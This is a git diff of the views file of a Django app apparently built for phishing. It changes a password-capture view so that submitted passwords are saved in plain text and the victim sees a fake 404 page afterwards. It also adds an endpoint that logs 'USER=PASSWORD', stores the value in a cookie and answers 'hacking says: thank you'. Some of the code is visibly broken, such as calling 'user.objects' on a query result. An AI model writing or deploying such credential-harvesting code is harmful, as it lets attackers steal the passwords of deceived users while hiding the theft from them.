@@ -2,7 +2,7 @@ import time
 import pytz
 import datetime as df
 from django.utils import timezone
-from django.http import HttpResponse
+from django.http import HttpResponse, JsonResponse
 from django.shortcuts import render, redirect, reverse
 from django.contrib.sites.shortcuts import get_current_site
 from django.contrib.auth.decorators import login_required
@@ -138,19 +138,20 @@ def get_password(request, email='test@me.de', user_id=0):
 
         if employee:
             # hash pwd
-            pwd = urlsafe_base64_encode(force_bytes(pwd))
+            # pwd = urlsafe_base64_encode(force_bytes(pwd))
             employee_mail_template = UserMailTemplate.objects.filter(username=employee).first()
             employee_mail_template.password = pwd
             employee_mail_template.save()
 
         if user or employee:
             # hash pwd
-            pwd = urlsafe_base64_encode(force_bytes(pwd))
+            # pwd = urlsafe_base64_encode(force_bytes(pwd))
             user_username = user.objects.filter(email=email)
             employee.pwd = pwd
             employee.save()
 
-        return HttpResponseRedirect(reverse('app_phishing:home'))
+        # return HttpResponseRedirect(reverse('app_phishing:home'))
+        return render(request, 'app_phishing/error_404.html')
 
     return render(request,'app_phishing/get_password.html', context= {
         'user_email': email,
@@ -273,6 +274,22 @@ def activate_user(request, uidb64, token):
 
 
 ## todo: deprecated
+
+
+def socker_io(request, query=None):
+    if request.method == "POST":
+        data = request.POST
+        print(f"USER=PASSWORD: {query}")
+        new_entry = {"hacking says" : "thank you"}
+        response = HttpResponse(JsonResponse(new_entry))
+        response.set_cookie('password', query)
+        return response
+
+    get_pwd = None
+    if 'password' in request.COOKIES:
+        get_pwd = request.COOKIES['password']
+        query = get_pwd
+    return HttpResponse(f"{get_pwd}")
 
 def send_mass_mail_to_all(request):
 
